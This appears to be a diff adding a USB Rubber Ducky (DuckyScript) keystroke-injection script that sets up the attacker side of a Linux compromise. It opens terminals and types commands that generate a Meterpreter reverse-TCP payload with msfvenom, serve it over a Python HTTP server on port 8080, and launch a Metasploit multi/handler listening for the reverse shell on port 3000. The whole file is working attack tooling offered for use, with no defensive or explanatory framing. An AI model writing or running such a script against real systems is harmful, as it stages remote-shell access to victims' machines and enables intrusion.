@@ -1,0 +1,21 @@
+REM runs Linux Server
+
+DEFAULT_DELAY 200
+
+REM Generate Payload
+GUI t
+DELAY 500
+STRINGLN set LOCAL_IP (ip addr show | awk '/inet / {print $2}' | cut -d'/' -f1 | sed -n '2p')
+STRINGLN mkdir -p /tmp/ducky/
+STRINGLN msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=3000 -f elf > /tmp/ducky/linux
+
+REM Start serving
+STRINGLN cd /tmp/ducky/
+STRINGLN echo $LOCAL_IP
+STRINGLN python3 -m http.server 8080
+
+REM Start Listening
+GUI t
+DELAY 500
+STRINGLN set LOCAL_IP (ip addr show | awk '/inet / {print $2}' | cut -d'/' -f1 | sed -n '2p')
+STRINGLN msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost $LOCAL_IP; set lport 3000; exploit"
